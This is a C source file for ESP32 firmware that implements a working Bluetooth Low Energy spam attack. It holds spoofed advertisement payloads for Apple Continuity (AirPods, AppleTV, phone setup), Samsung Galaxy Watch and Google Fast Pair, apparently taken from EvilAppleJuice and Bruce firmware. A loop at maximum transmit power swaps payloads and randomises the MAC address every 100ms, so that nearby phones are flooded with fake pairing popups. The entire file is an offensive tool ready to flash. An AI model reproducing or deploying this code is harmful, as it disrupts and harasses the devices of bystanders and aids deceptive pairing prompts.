#include <string.h>
#include <stdio.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_log.h"
#include "esp_random.h"

#include "app_state.h"
#include "ble_spam.h"

static const char *TAG = "ble_spam";

/* =====================================================
 *  Apple payloads — from EvilAppleJuice (ECTO-1A)
 *  Type 0x07 = Continuity Pairing (proximity popup)
 *  Type 0x04 = Continuity Setup (AppleTV/Setup popups)
 * ===================================================== */

static const uint8_t apple_airpods[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t apple_airpods_pro[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t apple_airpods_max[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t apple_airpods_gen2[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t apple_airpods_pro_gen2[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t apple_appletv_setup[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
};

static const uint8_t apple_appletv_pair[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
};

static const uint8_t apple_setup_new_phone[] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
    0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
};

#define APPLE_PAYLOAD_COUNT 8
static const uint8_t *apple_payloads[APPLE_PAYLOAD_COUNT] = {
    apple_airpods, apple_airpods_pro, apple_airpods_max,
    apple_airpods_gen2, apple_airpods_pro_gen2,
    apple_appletv_setup, apple_appletv_pair, apple_setup_new_phone
};
static const size_t apple_sizes[APPLE_PAYLOAD_COUNT] = {
    sizeof(apple_airpods), sizeof(apple_airpods_pro), sizeof(apple_airpods_max),
    sizeof(apple_airpods_gen2), sizeof(apple_airpods_pro_gen2),
    sizeof(apple_appletv_setup), sizeof(apple_appletv_pair), sizeof(apple_setup_new_phone)
};

/* =====================================================
 *  Samsung — Galaxy Watch pairing popup
 *  Company ID: 0x0075 (Samsung)
 *  From Bruce firmware
 * ===================================================== */

static const uint8_t samsung_base[] = {
    0x0F, 0xFF, 0x75, 0x00,
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
    0xFF, 0x00, 0x00, 0x43, 0x01
};

static const uint8_t samsung_models[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13,
    0x14, 0x15, 0x16, 0x17, 0x18, 0x1B, 0x1C, 0x1D,
    0x1E, 0x20
};
#define SAMSUNG_MODEL_COUNT 26

/* =====================================================
 *  Google Fast Pair — pairing popup
 *  Service UUID: 0xFE2C
 *  From Bruce firmware
 * ===================================================== */

static const uint8_t google_base[] = {
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE,
    0x00, 0x00, 0x00,
    0x02, 0x0A, 0x00
};

static const uint32_t google_models[] = {
    0x0001F0, 0x000047, 0x00000A, 0x00000B, 0x00000D,
    0x000007, 0x090000, 0x000048, 0x001000, 0x00B727,
    0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
    0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66,
    0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD, 0x000006,
    0x060000, 0xD446A7, 0x038B91, 0x02F637, 0x02D886,
    0xF00001, 0xF00201, 0xF00209, 0xF00205, 0xF00305,
    0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963,
    0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0,
    0x1E8B18, 0x1E955B, 0x06AE20, 0x06C197, 0x06C95C,
    0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426,
    0x054B2D, 0x0660D7, 0x0903F0
};
#define GOOGLE_MODEL_COUNT (sizeof(google_models) / sizeof(google_models[0]))

/* =====================================================
 *  GAP callback — drives advertising lifecycle
 * ===================================================== */

static esp_ble_adv_params_t s_adv_params = {0};

static void esp_gap_ble_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
{
    switch (event) {
        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
            esp_ble_gap_start_advertising(&s_adv_params);
            break;
        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
            if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
                ESP_LOGE(TAG, "Adv start failed: %s", esp_err_to_name(param->adv_start_cmpl.status));
            }
            break;
        default:
            break;
    }
}

/* =====================================================
 *  State
 * ===================================================== */

static volatile ble_spam_type_t s_ble_spam_type = BLE_SPAM_APPLE;

/* =====================================================
 *  BLE Spam Task
 * ===================================================== */

static void ble_spam_task(void *arg)
{
    ESP_LOGI(TAG, "BLE Spam started, type=%d", s_ble_spam_type);

    s_adv_params.adv_int_min       = 0x00A0;  /* 100ms */
    s_adv_params.adv_int_max       = 0x00C0;  /* 120ms */
    s_adv_params.adv_type          = ADV_TYPE_NONCONN_IND;
    s_adv_params.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
    s_adv_params.channel_map       = ADV_CHNL_ALL;
    s_adv_params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

    esp_ble_gap_register_callback(esp_gap_ble_cb);

    /* Set TX power to max for range */
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    int apple_idx = 0;
    int samsung_idx = 0;
    int google_idx = 0;
    int spam_idx = 0;

    while (s_ble_spam_running) {
        uint8_t payload[31];
        size_t payload_len = 0;

        switch (s_ble_spam_type) {
            case BLE_SPAM_APPLE:
                memcpy(payload, apple_payloads[apple_idx], apple_sizes[apple_idx]);
                payload_len = apple_sizes[apple_idx];
                apple_idx = (apple_idx + 1) % APPLE_PAYLOAD_COUNT;
                break;

            case BLE_SPAM_SAMSUNG:
                memcpy(payload, samsung_base, sizeof(samsung_base));
                payload_len = sizeof(samsung_base);
                payload[14] = samsung_models[samsung_idx];
                samsung_idx = (samsung_idx + 1) % SAMSUNG_MODEL_COUNT;
                break;

            case BLE_SPAM_GOOGLE:
                memcpy(payload, google_base, sizeof(google_base));
                payload_len = sizeof(google_base);
                {
                    uint32_t m = google_models[google_idx];
                    payload[8] = (m >> 16) & 0xFF;
                    payload[9] = (m >> 8) & 0xFF;
                    payload[10] = m & 0xFF;
                    payload[13] = (esp_random() % 120) - 100;
                }
                google_idx = (google_idx + 1) % GOOGLE_MODEL_COUNT;
                break;

            case BLE_SPAM_ALL:
                switch (spam_idx % 3) {
                    case 0:
                        memcpy(payload, apple_payloads[apple_idx], apple_sizes[apple_idx]);
                        payload_len = apple_sizes[apple_idx];
                        apple_idx = (apple_idx + 1) % APPLE_PAYLOAD_COUNT;
                        break;
                    case 1:
                        memcpy(payload, samsung_base, sizeof(samsung_base));
                        payload_len = sizeof(samsung_base);
                        payload[14] = samsung_models[samsung_idx];
                        samsung_idx = (samsung_idx + 1) % SAMSUNG_MODEL_COUNT;
                        break;
                    case 2:
                        memcpy(payload, google_base, sizeof(google_base));
                        payload_len = sizeof(google_base);
                        {
                            uint32_t m = google_models[google_idx];
                            payload[8] = (m >> 16) & 0xFF;
                            payload[9] = (m >> 8) & 0xFF;
                            payload[10] = m & 0xFF;
                            payload[13] = (esp_random() % 120) - 100;
                        }
                        google_idx = (google_idx + 1) % GOOGLE_MODEL_COUNT;
                        break;
                }
                spam_idx++;
                break;
        }

        /* Randomize MAC address */
        uint8_t rand_addr[6];
        rand_addr[0] = (esp_random() & 0x3F) | 0xC0;  /* Locally administered, unicast */
        for (int i = 1; i < 6; i++) {
            rand_addr[i] = esp_random() & 0xFF;
        }
        esp_ble_gap_set_rand_addr(rand_addr);

        /* Set advertising data — GAP callback will start advertising */
        esp_ble_gap_config_adv_data_raw(payload, payload_len);
        s_ble_spam_count++;

        /* Let advertising run for ~100ms, then stop and re-advertise with new payload */
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    esp_ble_gap_stop_advertising();
    ESP_LOGI(TAG, "BLE Spam stopped. Total: %"PRIu32, s_ble_spam_count);
    vTaskDelete(NULL);
}

/* =====================================================
 *  Public API
 * ===================================================== */

void ble_spam_start(ble_spam_type_t type)
{
    if (s_ble_spam_running) {
        ble_spam_stop();
    }
    s_ble_spam_type = type;
    s_ble_spam_running = true;
    s_ble_spam_count = 0;
    xTaskCreate(ble_spam_task, "ble_spam", 4096, NULL, 5, NULL);
}

void ble_spam_stop(void)
{
    if (s_ble_spam_running) {
        s_ble_spam_running = false;
        vTaskDelay(pdMS_TO_TICKS(200));
    }
}
